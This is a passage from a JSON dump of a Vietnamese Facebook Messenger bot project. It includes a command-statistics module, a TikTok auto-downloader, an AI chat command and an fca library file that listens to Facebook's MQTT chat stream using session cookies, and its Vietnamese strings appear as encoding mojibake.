data.daily[commandName] = 0;\n    if (!data.weekly[commandName]) data.weekly[commandName] = 0;\n    if (!data.total[commandName]) data.total[commandName] = 0;\n\n    data.daily[commandName]++;\n    data.weekly[commandName]++;\n    data.total[commandName]++;\n\n    data.lastUpdateDay = today;\n    data.lastUpdateWeek = weekStart;\n\n    fs.writeFileSync(dataPath, JSON.stringify(data, null, 4));\n};\n\nfunction convertToFancyNumber(number) {\n    const fancyNumbers = ['ùüé', 'ùüè', 'ùüê', 'ùüë', 'ùüí', 'ùüì', 'ùüî', 'ùüï', 'ùüñ', 'ùüó'];\n    return number.toString().split('').map(digit => fancyNumbers[digit] || digit).join('');\n}\n\nmodule.exports.run = function ({ event, api, args }) {\n    const data = JSON.parse(fs.readFileSync(dataPath, 'utf-8'));\n    const query = args[0] ? args[0].toLowerCase() : '';\n\n    let message = '';\n    switch (query) {\n        case 'day': {\n            const dailyData = Object.entries(data.daily)\n                .filter(([, count]) => count > 0)\n                .sort((a, b) => b[1] - a[1])\n                .slice(0, 50);\n\n            message = dailyData.length === 0\n                ? \"Kh√¥ng c√≥ l·ªánh n√†o ƒë∆∞·ª£c s·ª≠ d·ª•ng trong ng√†y h√¥m nay.\"\n                : \">>>ùêìùêéùêè ùêÇùêéùêåùêåùêÄùêçùêÉùêí ùêÉùêÄùêò<<<\\n\" +\n                  dailyData.map(([command, count], index) =>\n                      `ùêìùêéùêè ${convertToFancyNumber(index + 1)}: ${command}: ${count} ùê•ùêÆÃõùê®ÃõÃ£ùê≠`\n                  ).join('\\n');\n            break;\n        }\n        case 'week': {\n            const weeklyData = Object.entries(data.weekly)\n                .filter(([, count]) => count > 0)\n                .sort((a, b) => b[1] - a[1])\n                .slice(0, 50);\n\n            message = weeklyData.length === 0\n                ? \"Kh√¥ng c√≥ l·ªánh n√†o ƒë∆∞·ª£c s·ª≠ d·ª•ng trong tu·∫ßn n√†y.\"\n                : \">>>ùêìùêéùêè ùêÇùêéùêåùêåùêÄùêçùêÉùêí ùêñùêÑùêÑùêä<<<\\n\" +\n                  weeklyData.map(([command, count], index) =>\n                      `ùêìùêéùêè ${convertToFancyNumber(index + 1)}: ${command}: ${count} ùê•ùêÆÃõùê®ÃõÃ£ùê≠`\n                  ).join('\\n');\n            break;\n        }\n        case 'all': {\n            const totalData = Object.entries(data.total)\n                .filter(([, count]) => count > 0)\n                .sort((a, b) => b[1] - a[1])\n                .slice(0, 50);\n\n            message = totalData.length === 0\n                ? \"Kh√¥ng c√≥ l·ªánh n√†o ƒë∆∞·ª£c s·ª≠ d·ª•ng t·ªïng c·ªông.\"\n                : \">>>ùêìùêéùêè ùêÇùêéùêåùêåùêÄùêçùêÉùêí ùêÄùêãùêã<<<\\n\" +\n                  totalData.map(([command, count], index) =>\n                      `ùêìùêéùêè ${convertToFancyNumber(index + 1)}: ${command}: ${count} ùê•ùêÆÃõùê®ÃõÃ£ùê≠`\n                  ).join('\\n');\n            break;\n        }\n        case 'reset': {\n            const initialData = {\n                daily: {},\n                weekly: {},\n                total: {},\n                lastUpdateDay: moment().format('YYYY-MM-DD'),\n                lastUpdateWeek: moment().startOf('isoWeek').format('YYYY-MM-DD'),\n            };\n            fs.writeFileSync(dataPath, JSON.stringify(initialData, null, 4));\n            message = \"‚úÖ ƒê√£ reset d·ªØ li·ªáu s·ª≠ d·ª•ng l·ªánh th√†nh c√¥ng!\";\n            break;\n        }\n        default:\n            message = \"Vui l√≤ng s·ª≠ d·ª•ng l·ªánh v·ªõi c√°c t√πy ch·ªçn: `day`, `week`, `all`, ho·∫∑c `reset`.\";\n            break;\n    }\n\n    api.sendMessage(message, event.threadID);\n};\n","path":null,"size_bytes":6408,"size_tokens":null},"modules/commands/atdtiktok.js":{"content":"const axios = require(\"axios\");\nconst fs = require(\"fs\");\n\nconst isURL = (u) => /^http(|s):\\/\\//.test(u);\n\nexports.handleEvent = async function (o) {\n  try {\n    const str = o.event.body;\n    const send = (msg) =>\n      o.api.sendMessage(msg, o.event.threadID, o.event.messageID);\n    const head = (app) =>\n      `==„Äé AUTODOWN ${app.toUpperCase()} „Äè==\\n‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ`;\n    \n      if (/(^https:\\/\\/)((vm|vt|www|v)\\.)?(tiktok|douyin)\\.com\\//.test(str)) {\n                const json = await infoPostTT(str);\n                let attachment = [];\n                if (json.images != undefined) {\n                    for (const $ of json.images) {\n                        attachment.push(await streamURL($, 'png'));\n                    }\n                } else {\n                    attachment = await streamURL(json.play, 'mp4');\n                }\n          o.api.sendMessage({body: `            ====„ÄéùêÄùêÆùê≠ùê®ùêùùê®ùê∞ùêß ùêìùê¢ùê§ùê≠ùê®ùê§„Äè====       \n‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±\n‚Ä¢üë§ ùêìùêûÃÇùêß ùêäùêûÃÇùêßùê°: ${json.author.nickname}\n‚Ä¢üòΩ ùêàùêÉ ùêßùê†ùêÆÃõùê®ÃõÃÄùê¢ ùêùùêÆÃÄùêßùê†: ${json.author.unique_id}\n‚Ä¢üåê ùêêùêÆùê®ÃÇÃÅùêú ùê†ùê¢ùêö: ${json.region}\n‚Ä¢üí¨ ùêìùê¢ùêûÃÇùêÆ ƒêùêûÃÇÃÄ: ${json.title}\n‚Ä¢‚ù§Ô∏è ùóüùòÇÃõùóºÃõÃ£ùòÅ ùòÅùó∂ùó∫: ${json.digg_count}\n‚Ä¢üëÅ‚Äçüó® ùêãùêÆÃõùê®ÃõÃ£ùê≠ ùê±ùêûùê¶: ${json.play_count}\n‚Ä¢üí≠ ùêãùêÆÃõùê®ÃõÃ£ùê≠ ùóØùó∂ÃÄùóªùóµ ùóπùòÇùóÆÃ£ÃÇùóª: ${json.comment_count}\n‚Ä¢üîó ùóüùòÇÃõùóºÃõÃ£ùòÅ ùó∞ùóµùó∂ùóÆ ùòÄùó≤Ãâ: ${json.share_count}\n‚Ä¢‚è∞ Th·ªùi gian: ${json.duration}s\n‚Ä¢üì• ùóüùòÇÃõùóºÃõÃ£ùòÅ ùòÅùóÆÃâùó∂: ${json.download_count}\n‚Ä¢ùóßùóµùóÆÃâ üòº ùóªùó≤ÃÇÃÅùòÇ ùó∫ùòÇùóºÃÇÃÅùóª ùòÅùóÆÃâùó∂ ùóªùóµùóÆÃ£ùó∞\n‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±`, attachment },o.event.threadID,(error, info) => {\n    global.client.handleReaction.push({\n      name: this.config.name, \n      messageID: info.messageID,\n      author: o.event.senderID,\n      data: json\n      \n          })\n                },o.event.messageID);\n                    } \n\n                    \n    } catch(e) {\n    }\n};\nexports.run = () => {};\nexports.handleReaction = async function (o){\n  const { threadID: t, messageID: m, reaction: r } = o.event\n  const { handleReaction: _ } = o\n  if (r != \"üòº\") return; \n  o.api.sendMessage({ body: `\n  ====„Äé MUSIC TIKTOK „Äè====\n‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±\nüë§ ùêàùêÉ: ${_.data.music_info.id}\nüí¨ ùêìùê¢ùêûÃÇùêÆ ƒêùêûÃÇÃÄ: ${_.data.music_info.title}\nüîó ùêãùê¢ùêßùê§: ${_.data.music_info.play}\n‚è±Ô∏è ùêìùê°ùê®ÃõÃÄùê¢ ùê†ùê¢ùêöùêß: ${_.data.music_info.duration}\n‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±`,attachment: await streamURL(_.data.music, \"mp3\")},t,m)\n}\n\nexports.config = {\n    name: 'atdtiktok',\n    version: '1',\n    hasPermssion: 0,\n    credits: 'C√¥ng Nam mod all Harin',\n    description: '',\n    commandCategory: 'Ti·ªán √≠ch',\n    usages: [],\n    cooldowns: 3\n};\n\nfunction streamURL(url, type) {\n    return axios.get(url, {\n        responseType: 'arraybuffer'\n    }).then(res => {\n        const path = __dirname + `/cache/${Date.now()}.${type}`;\n        fs.writeFileSync(path, res.data);\n        setTimeout(p => fs.unlinkSync(p), 1000 * 60, path);\n        return fs.createReadStream(path);\n    });\n}\n\nfunction infoPostTT(url) {\n    return axios({\n        method: 'post',\n        url: `https://tikwm.com/api/`,\n        data: {\n            url\n        },\n        headers: {\n            'content-type': 'application/json'\n        }\n    }).then(res => res.data.data);\n  }","path":null,"size_bytes":3651,"size_tokens":null},"modules/commands/claude.js":{"content":"const axios = require('axios'); \nconst fs = require('fs');\nconst path = require('path');\n\nmodule.exports.config = {\n    name: \"claude\",\n    version: \"1.1.0\",\n    hasPermssion: 0,\n    credits: \"TatsuYTB\",\n    description: \"Chat v·ªõi AI\",\n    commandCategory: \"AI\",\n    usages: \"claude n·ªôi dung\",\n    cooldowns: 10,\n};\n\nconst getApiUrl = () => {\n    try {\n        const filePath = path.join(__dirname, 'data', 'api.json');\n        const data = fs.readFileSync(filePath, 'utf-8');\n        const jsonData = JSON.parse(data);\n\n        if (!jsonData.claude || jsonData.claude.trim() === '') {\n            return null;\n        }\n\n        return jsonData.claude;\n    } catch {\n        return null;\n    }\n};\n\nconst getChatResponse = async (text) => {\n    const apiUrl = getApiUrl();\n    if (!apiUrl) {\n        throw new Error(\"ƒêang c·∫≠p nh·∫≠t!!!\");\n    }\n\n    for (let uid = 1; uid <= 9; uid++) {\n        try {\n            const response = await axios.get(`${apiUrl}?prompt=${encodeURIComponent(text)}&uid=${uid}`);\n            if (response.data && response.data.result) {\n                return response.data.result;\n            }\n        } catch {\n        }\n    }\n\n    throw new Error(\"T·∫•t c·∫£ c√°c UID ƒë·ªÅu kh√¥ng ph·∫£n h·ªìi, vui l√≤ng th·ª≠ l·∫°i sau.\");\n};\n\nconst botMessages = new Map();\n\nmodule.exports.run = async ({ api, event, args }) => {\n    try {\n        const text = args.join(' ');\n        if (!text) {\n            return api.sendMessage('Vui l√≤ng cung c·∫•p n·ªôi dung ƒë·ªÉ chat v·ªõi AI.', event.threadID, event.messageID);\n        }\n\n        const response = await getChatResponse(text);\n\n        const messageID = await new Promise((resolve, reject) => {\n            api.sendMessage(response, event.threadID, (error, info) => {\n                if (error) {\n                    reject(error);\n                } else {\n                    resolve(info.messageID);\n                }\n            }, event.messageID);\n        });\n\n        botMessages.set(messageID, event.threadID);\n    } catch (error) {\n        api.sendMessage(`${error.message}`, event.threadID, event.messageID);\n    }\n};\n\nmodule.exports.handleReply = async ({ api, event }) => {\n    try {\n        if (!event.messageReply || !botMessages.has(event.messageReply.messageID)) {\n            return;\n        }\n\n        const text = event.body;\n        const response = await getChatResponse(text);\n\n        const messageID = await new Promise((resolve, reject) => {\n            api.sendMessage(response, event.threadID, (error, info) => {\n                if (error) {\n                    reject(error);\n                } else {\n                    resolve(info.messageID);\n                }\n            }, event.messageID);\n        });\n\n        botMessages.set(messageID, event.threadID);\n        botMessages.delete(event.messageReply.messageID);\n    } catch (error) {\n        api.sendMessage(`${error.message}`, event.threadID, event.messageID);\n    }\n};\n\nmodule.exports.handleEvent = async function({ api, event }) {\n    if (event.type === \"message_reply\") {\n        await this.handleReply({ api, event });\n    }\n};\n\nmodule.exports.languages = {\n    \"vi\": {\n        \"description\": \"Chat v·ªõi AI th√¥ng qua API\"\n    }\n};\n","path":null,"size_bytes":3208,"size_tokens":null},"lib/fca-auto/src/listenMqttV1.js":{"content":"/* eslint-disable no-redeclare */\n\"use strict\";\nconst utils = require(\"../utils\");\nconst log = require(\"npmlog\");\nconst mqtt = require('mqtt');\nconst Websocket = require('ws');\nconst HttpsProxyAgent = require('https-proxy-agent');\nconst EventEmitter = require('events');\nconst Duplexify = require('duplexify');\nconst Transform = require('readable-stream').Transform;\nvar identity = function () { };\nvar form = {};\nvar getSeqID = function () { };\n\n\nvar topics = [\"/ls_req\",\"/ls_resp\",\"/legacy_web\",\"/webrtc\",\"/rtc_multi\",\"/onevc\",\"/br_sr\",\"/sr_res\",\"/t_ms\",\"/thread_typing\",\"/orca_typing_notifications\",\"/notify_disconnect\",\"/orca_presence\",\"/inbox\",\"/mercury\", \"/messaging_events\", \"/orca_message_notifications\", \"/pp\",\"/webrtc_response\"];\n\n/* [ Noti ? ]\n!   \"/br_sr\", //Notification\n    * => Need to publish /br_sr right after this\n   \n!   \"/notify_disconnect\",\n    * => Need to publish /messenger_sync_create_queue right after this\n\n!   \"/orca_presence\",\n    * => Will receive /sr_res right here.\n  */\n\nvar WebSocket_Global;\n\nfunction buildProxy() {\n    var Proxy = new Transform({\n        objectMode: false\n    });\n\n    Proxy._write = function socketWriteNode(chunk, enc, next) {\n        if (WebSocket_Global.readyState !== WebSocket_Global.OPEN) {\n            return next();\n        }\n    \n        if (typeof chunk === 'string') {\n            chunk = new Buffer.from(chunk, 'utf8');\n        }\n        WebSocket_Global.send(chunk, next);\n    };\n\n    Proxy._flush = function(done) {\n        WebSocket_Global.close();\n        done();\n    };\n\n    Proxy._writev = function(chunks, cb) {\n        var buffers = new Array(chunks.length);\n        for (var i = 0; i < chunks.length; i++) {\n            if (typeof chunks[i].chunk === 'string') {\n                buffers[i] = new Buffer.from(chunks[i], 'utf8');\n            } else {\n                buffers[i] = chunks[i].chunk;\n            }\n        }\n        this._write(new Buffer.concat(buffers), 'binary', cb);\n    };\n\n    return Proxy;\n}\n\nfunction buildStream(options, WebSocket, Proxy) {\n    const Stream = Duplexify(undefined, undefined, options);\n    Stream.socket = WebSocket;\n    \n    WebSocket \n        .onclose = function() {\n            Stream.end();\n            Stream.destroy();\n        };\n    WebSocket\n        .onerror = function(err) {\n            Stream.destroy(err);\n        };\n    WebSocket\n        .onmessage = function(event) {\n            var data = event.data;\n            if (data instanceof ArrayBuffer) data = new Buffer.from(data);\n            else data = new Buffer.from(data, 'utf8');\n            Stream.push(data);\n        };\n    WebSocket\n        .onopen = function() {\n            Stream.setReadable(Proxy);\n            Stream.setWritable(Proxy);\n            Stream.emit('connect');\n        };\n    WebSocket_Global = WebSocket;\n    Proxy.on('close', function() { WebSocket.close(); });\n    return Stream;\n}\n\n\nfunction listenMqtt(defaultFuncs, api, ctx, globalCallback) {\n    //Don't really know what this does but I think it's for the act`ive state?\n    //TODO: Move to ctx when implemented\n    var chatOn = ctx.globalOptions.online;\n    var foreground = false;\n\n    var sessionID = Math.floor((Math.random() * Number.MAX_SAFE_INTEGER)+1);\n    var username = {u: ctx.userID,s: sessionID,chat_on: chatOn,fg: foreground,d: utils.getGUID(),ct: \"websocket\",aid: \"219994525426954\", mqtt_sid: \"\",cp: 3,ecp: 10,st: [],pm: [],dc: \"\",no_auto_fg: true,gas: null,pack: []};\n    var cookies = ctx.jar.getCookies('https://www.facebook.com').join(\"; \");\n\n    var host;\n    if (ctx.mqttEndpoint) host = `${ctx.mqttEndpoint}&sid=${sessionID}`;\n    else if (ctx.region) host = `wss://edge-chat.facebook.com/chat?region=${ctx.region.toLocaleLowerCase()}&sid=${sessionID}`;\n    else host = `wss://edge-chat.facebook.com/chat?sid=${sessionID}`;\n\n    var options = { \n        clientId: \"mqttwsclient\",\n        protocolId: 'MQIsdp',\n        protocolVersion: 3,\n        username: JSON.stringify(username), \n        clean: true,\n        wsOptions: {\n            headers: {\n                'Cookie': cookies,\n                'Origin': 'https://www.facebook.com',\n                'User-Agent': (ctx.globalOptions.userAgent || 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'),\n                'Referer': 'https://www.facebook.com/',\n                'Host': new URL(host).hostname //'edge-chat.facebook.com'\n            },\n            origin: 'https://www.facebook.com',\n            protocolVersion: 13,\n            binaryType: 'arraybuffer',\n        },\n        keepalive: 60,\n        reschedulePings: true,\n        reconnectPeriod: 3\n    };\n\n    if (typeof ctx.globalOptions.proxy != \"undefined\") {\n        var agent = new HttpsProxyAgent(ctx.globalOptions.proxy);\n        options.wsOptions.agent = agent;\n    }\n    ctx.mqttClient = new mqtt.Client(_ => buildStream(options, new Websocket(host, options.wsOptions), buildProxy()), options);\n    global.mqttClient = ctx.mqttClient;\n\n    global.mqttClient.on('error', function (err) {\n        log.error(\"listenMqtt\", err);\n        global.mqttClient.end();\n\n        if (ctx.globalOptions.autoReconnect) getSeqID();\n        else {\n            globalCallback({ type: \"stop_listen\", error: \"Server ƒê√£ S·∫≠p - Auto Restart\" }, null);\n            return process.exit(1);\n        }\n    });\n\n    global.mqttClient.on('connect', function () {\n        if (!global.Fca.Data.Setup || global.Fca.Data.Setup == undefined) {\n            if (global.Fca.Require.FastConfig.RestartMQTT_Minutes != 0 && global.Fca.Data.StopListening != true) { \n                global.Fca.Data.Setup = true;\n                setTimeout(() => {\n                    global.Fca.Require.logger.Warning(\"Closing MQTT Client...\");\n                    ctx.mqttClient.end();\n                    global.Fca.Require.logger.Warning(\"Reconnecting MQTT Client...\");\n                    global.Fca.Data.Setup = false;\n                    getSeqID();\n                }, Number(global.Fca.Require.FastConfig.RestartMQTT_Minutes) * 60 * 1000);\n            }        \n        }\n        if (process.env.OnStatus == undefined) {\n            global.Fca.Require.logger.Normal(\"B·∫°n ƒêang S√†i Phi√™n B·∫£n: Premium Access\");\n            if (Number(global.Fca.Require.FastConfig.AutoRestartMinutes) == 0) {\n                // something\n            }\n            else if (Number(global.Fca.Require.FastConfig.AutoRestartMinutes < 10)) {\n                log.warn(\"AutoRestartMinutes\",\"The number of minutes to automatically restart must be more than 10 minutes\");\n            }\n            else if (Number(global.Fca.Require.FastConfig.AutoRestartMinutes) < 0) {\n                log.warn(\"AutoRestartMinutes\",\"Invalid auto-restart minutes!\");\n            }\n            else {\n                global.Fca.Require.logger.Normal(global.Fca.getText(global.Fca.Require.Language.Src.AutoRestart,global.Fca.Require.FastConfig.AutoRestartMinutes));\n                global.Fca.Require.logger.Normal(\"Auto Restart MQTT Client After: \" + global.Fca.Require.FastConfig.RestartMQTT_Minutes + \" Minutes\");\n                setInterval(() => { \n                    global.Fca.Require.logger.Normal(global.Fca.Require.Language.Src.OnRestart);\n                    process.exit(1);\n                }, Number(global.Fca.Require.FastConfig.AutoRestartMinutes) * 60000);\n            }\n            require('../broadcast').startBroadcasting();\n            const MemoryManager = require('../Extra/Src/Release_Memory');\n            const path = require('path');\n\n            const memoryManager = new MemoryManager({\n                warningThreshold: 0.6,\n                releaseThreshold: 0.7, \n                maxThreshold: 0.8, \n                interval: 30 * 1000,\n                logLevel: 'warn',\n                logFile: path.join(__dirname, 'memory.log'),\n                smartReleaseEnabled: true,\n            });\n\n\n            memoryManager.autoStart(60 * 60 * 1000); \n\n            process.env.OnStatus = true;\n        }\n        \n        topics.forEach(topicsub => global.mqttClient.subscribe(topicsub));\n\n        var topic;\n        var queue = {\n            sync_api_version: 11,\n            max_deltas_able_to_process: 100,\n            delta_batch_size: 500,\n            encoding: \"JSON\",\n            entity_fbid: ctx.userID,\n        };\n\n        topic = \"/messenger_sync_create_queue\";\n        queue.initial_titan_sequence_id = ctx.lastSeqId;\n        queue.device_params = null;\n\n        global.mqttClient.publish(topic, JSON.stringify(queue), { qos: 1, retain: false });\n\n        var rTimeout = setTimeout(function () {\n            global.mqttClient.end();\n            getSeqID();\n        }, 3000);\n\n        ctx.tmsWait = function () {\n            clearTimeout(rTimeout);\n            ctx.globalOptions.emitReady ? globalCallback({type: \"ready\",error: null}) : '';\n            delete ctx.tmsWait;\n        };\n    });\n\n    global.mqttClient.on('message', function (topic, message, _packet) {\n        const jsonMessage = JSON.parse(message.toString());\n        console.log(message.toString())\n        if (topic === \"/t_ms\") {\n            if (ctx.tmsWait && typeof ctx.tmsWait == \"function\") ctx.tmsWait();\n\n            if (jsonMessage.firstDeltaSeqId && jsonMessage.syncToken) {\n                ctx.lastSeqId = jsonMessage.firstDeltaSeqId;\n                ctx.syncToken = jsonMessage.syncToken;\n            }\n\n            if (jsonMessage.lastIssuedSeqId) ctx.lastSeqId = parseInt(jsonMessage.lastIssuedSeqId);\n            //If it contains more than 1 delta\n            for (var i in jsonMessage.deltas) {\n                var delta = jsonMessage.deltas[i];\n                parseDelta(defaultFuncs, api, ctx, globalCallback, { \"delta\": delta });\n            }\n        } \n        else if (topic === \"/ls_resp\") {\n            console.log((jsonMessage.payload));\n            const payload = JSON.parse(jsonMessage.payload); //'{\"name\":null,\"step\":[1,[1,[4,0,1,[5,\"taskExists\",[19,\"415\"]]],[23,[2,0],[1,[5,\"replaceOptimsiticMessage\",\"7192532113093667880\",\"mid.$gABfX5li9LA6VdUymnWPRAdlkiawo\"]]]],[1,[4,0,1,[5,\"taskExists\",[19,\"415\"]]],[23,[2,0],[1,[5,\"mailboxTaskCompletionApiOnTaskCompletion\",[19,\"415\"],true]]]],[1,[4,0,1,[5,\"taskExists\",[19,\"415\"]]],[23,[2,0],[1,[5,\"removeTask\",[19,\"415\"],[9]]]]]]}'\n            const request_ID = jsonMessage.request_id;\n            if (ctx.callback_Task[request_ID] != undefined) {\n                const { callback, type } = ctx.callback_Task[request_ID];\n                const Data = new getRespData(type, payload);\n\n                if (!Data) {\n                    callback(\"Something went wrong üê≥\", null);\n                }\n                else {\n                    callback(null, Data);\n                }\n            }\n        }\n        else if (topic === \"/thread_typing\" || topic === \"/orca_typing_notifications\") {\n            var typ = {\n                type: \"typ\",\n                isTyping: !!jsonMessage.state,\n                from: jsonMessage.sender_fbid.toString(),\n                threadID: utils.formatID((jsonMessage.thread || jsonMessage.sender_fbid).toString())\n            };\n            (function () { globalCallback(null, typ); })();\n        } else if (topic === \"/orca_presence\") {\n            if (!ctx.globalOptions.updatePresence) {\n                for (var i in jsonMessage.list) {\n                    var data = jsonMessage.list[i];\n                    var userID = data[\"u\"];\n\n                    var presence = {\n                        type: \"presence\",\n                        userID: userID.toString(),\n                        //Convert to ms\n                        timestamp: data[\"l\"] * 1000,\n                        statuses: data[\"p\"]\n                    };\n                    (function () { globalCallback(null, presence); })();\n                }\n            }\n        }\n\n    });\n\n    process.on('SIGINT', function () {\n        LogUptime();\n        process.kill(process.pid);\n    });\n\n    process.on('exit', () => {\n        LogUptime();\n    });\n    \n}\n\nfunction getRespData(Type, payload) {\n    try { \n        switch (Type) {\n            case \"sendMqttMessage\": {\n                return {\n                    type: Type,\n                    threadID: payload.step[1][2][2][1][2], //this is sick bro\n                    messageID: payload.step[1][2][2][1][3],\n                    payload: payload.step[1][2]\n                };\n            }\n            default: { //!very LAZY :> cook yourself\n                return {\n                    Data: payload.step[1][2][2][1],\n                    type: Type,\n                    payload: payload.step[1][2] \n                };\n            }\n        }\n    }\n    catch (e) {\n        return null;\n    }\n}\n\nfunction LogUptime() {\n    var uptime = process.uptime();\n    var { join } = require('path');\n    if (global.Fca.Require.fs.existsSync(join(__dirname, '../CountTime.json'))) {\n        var Time1 = (Number(global.Fca.Require.fs.readFileSync(join(__dirname, '../CountTime.json'), 'utf8')) || 0);\n        global.Fca.Require.fs.writeFileSync(join(__dirname, '../CountTime.json'), String(Number(uptime) + Time1), 'utf8');\n    }\n    else {\n        var Time1 = 0;\n        global.Fca.Require.fs.writeFileSync(join(__dirname, '../CountTime.json'), String(Number(uptime) + Time1), 'utf8');\n    }\n}\nfunction parseDelta(defaultFuncs, api, ctx, globalCallback, v) {\n    if (v.delta.class == \"NewMessage\") {\n        //Not tested for pages\n        if (ctx.globalOptions.pageID && ctx.globalOptions.pageID != v.queue) return;\n\n        (function resolveAttachmentUrl(i) {\n            if (v.delta.attachments && (i == v.delta.attachments.length) || utils.getType(v.delta.attachments) !== \"Array\") {\n                var fmtMsg;\n                try {\n                    fmtMsg = utils.formatDeltaMessage(v);\n                } catch (err) {\n                    return log.error(\"L·ªói Nh·∫π\", err);\n                }\n                global.Fca.Data.event = fmtMsg;\n                try {\n                    var { updateMessageCount,getData,hasData } = require('../Extra/ExtraGetThread');\n                    if (hasData(fmtMsg.threadID)) {\n                        var x = getData(fmtMsg.threadID);\n                        x.messageCount+=1;\n                        updateMessageCount(fmtMsg.threadID,x);\n                    }   \n                }\n                catch (e) {\n                    //temp\n                }\n                if (fmtMsg)\n                    if (ctx.globalOptions.autoMarkDelivery) markDelivery(ctx, api, fmtMsg.threadID, fmtMsg.messageID);\n\n                return !ctx.globalOptions.selfListen && fmtMsg.senderID === ctx.userID ? undefined : (function () { globalCallback(null, fmtMsg); })();\n            } else {\n                if (v.delta.attachments && (v.delta.attachments[i].mercury.attach_type == \"photo\")) {\n                    api.resolvePhotoUrl(v.delta.attachments[i].fbid, (err, url) => {\n                        if (!err) v.delta.attachments[i].mercury.metadata.url = url;\n                        return resolveAttachmentUrl(i + 1);\n                    });\n                } else return resolveAttachmentUrl(i + 1);\n            }\n        })(0);\n    }\n\n    if (v.delta.class == \"ClientPayload\") {\n        var clientPayload = utils.decodeClientPayload(v.delta.payload);\n        if (clientPayload && clientPayload.deltas) {\n            for (var i in clientPayload.deltas) {\n                var delta = clientPayload.deltas[i];\n                if (delta.deltaMessageReaction && !!ctx.globalOptions.listenEvents) {\n                    (function () {\n                        globalCallback(null, {\n                            type: \"message_reaction\",\n                            threadID: (delta.deltaMessageReaction.threadKey.threadFbId ? delta.deltaMessageReaction.threadKey.threadFbId : delta.deltaMessageReaction.threadKey.otherUserFbId).toString(),\n                            messageID: delta.deltaMessageReaction.messageId,\n                            reaction: delta.deltaMessageReaction.reaction,\n                            senderID: delta.deltaMessageReaction.senderId.toString(),\n                            userID: delta.deltaMessageReaction.userId.toString()\n                        });\n                    })();\n                } else if (delta.deltaRecallMessageData && !!ctx.globalOptions.listenEvents) {\n                    (function () {\n                        globalCallback(null, {\n                            type: \"message_unsend\",\n                            threadID: (delta.deltaRecallMessageData.threadKey.threadFbId ? delta.deltaRecallMessageData.threadKey.threadFbId : delta.deltaRecallMessageData.threadKey.otherUserFbId).toString(),\n                            messageID: delta.deltaRecallMessageData.messageID,\n                            senderID: delta.deltaRecallMessageData.senderID.toString(),\n                            deletionTimestamp: delta.deltaRecallMessageData.deletionTimestamp,\n                            timestamp: delta.deltaRecallMessageData.timestamp\n                        });\n                    })();\n                } else if (delta.deltaMessageReply) {\n                    //Mention block - #1\n                    var mdata =\n                        delta.deltaMessageReply.message === undefined ? [] :\n                            delta.deltaMessageReply.message.data === undefined ? [] :\n                                delta.deltaMessageReply.message.data.prng === undefined ? [] :\n                                    JSON.parse(delta.deltaMessageReply.message.data.prng);\n                    var m_id = mdata.map(u => u.i);\n                    var m_offset = mdata.map(u => u.o);\n                    var m_length = mdata.map(u => u.l);\n\n                    var mentions = {};\n\n                    for (var i = 0; i < m_id.length; i++) mentions[m_id[i]] = (delta.deltaMessageReply.message.body || \"\").substring(m_offset[i], m_offset[i] + m_length[i]);\n                    //Mention block - 1#\n                    var callbackToReturn = {\n                        type: \"message_reply\",\n                        threadID: (delta.deltaMessageReply.message.messageMetadata.threadKey.threadFbId ? delta.deltaMessageReply.message.messageMetadata.threadKey.threadFbId : delta.deltaMessageReply.message.messageMetadata.threadKey.otherUserFbId).toString(),\n                        messageID: delta.deltaMessageReply.message.messageMetadata.messageId,\n                        senderID: delta.deltaMessageReply.message.messageMetadata.actorFbId.toString(),\n                        attachments: delta.deltaMessageReply.message.attachments.map(function (att) {\n                            var mercury = JSON.parse(att.mercuryJSON);\n                            Object.assign(att, mercury);\n                            return att;\n                        }).map(att => {\n                            var x;\n                            try {\n                                x = utils._formatAttachment(att);\n                            } catch (ex) {\n                                x = att;\n                                x.error = ex;\n                                x.type = \"unknown\";\n                            }\n                            return x;\n                        }),\n                        args: (delta.deltaMessageReply.message.body || \"\").trim().split(/\\s+/),\n                        body: (delta.deltaMessageReply.message.body || \"\"),\n                        isGroup: !!delta.deltaMessageReply.message.messageMetadata.threadKey.threadFbId,\n                        mentions: mentions,\n                        timestamp: delta.deltaMessageReply.message.messageMetadata.timestamp,\n                        participantIDs: (delta.deltaMessageReply.message.participants || []).map(e => e.toString())\n                    };\n\n                    if (delta.deltaMessageReply.repliedToMessage) {\n                        //Mention block - #2\n                        mdata =\n                            delta.deltaMessageReply.repliedToMessage === undefined ? [] :\n                                delta.deltaMessageReply.repliedToMessage.data === undefined ? [] :\n                                    delta.deltaMessageReply.repliedToMessage.data.prng === undefined ? [] :\n                                        JSON.parse(delta.deltaMessageReply.repliedToMessage.data.prng);\n                        m_id = mdata.map(u => u.i);\n                        m_offset = mdata.map(u => u.o);\n                        m_length = mdata.map(u => u.l);\n\n                        var rmentions = {};\n\n                        for (var i = 0; i < m_id.length; i++) rmentions[m_id[i]] = (delta.deltaMessageReply.repliedToMessage.body || \"\").substring(m_offset[i], m_offset[i] + m_length[i]);\n                        //Mention block - 2#\n                        callbackToReturn.messageReply = {\n                            threadID: (delta.deltaMessageReply.repliedToMessage.messageMetadata.threadKey.threadFbId ? delta.deltaMessageReply.repliedToMessage.messageMetadata.threadKey.threadFbId : delta.deltaMessageReply.repliedToMessage.messageMetadata.threadKey.otherUserFbId).toString(),\n                            messageID: delta.deltaMessageReply.repliedToMessage.messageMetadata.messageId,\n                            senderID: delta.deltaMessageReply.repliedToMessage.messageMetadata.actorFbId.toString(),\n                            attachments: delta.deltaMessageReply.repliedToMessage.attachments.map(function (att) {\n                                var mercury = JSON.parse(att.mercuryJSON);\n                                Object.assign(att, mercury);\n                                return att;\n                            }).map(att => {\n                                var x;\n                                try {\n                                    x = utils._formatAttachment(att);\n                                } catch (ex) {\n                                    x = att;\n                                    x.error = 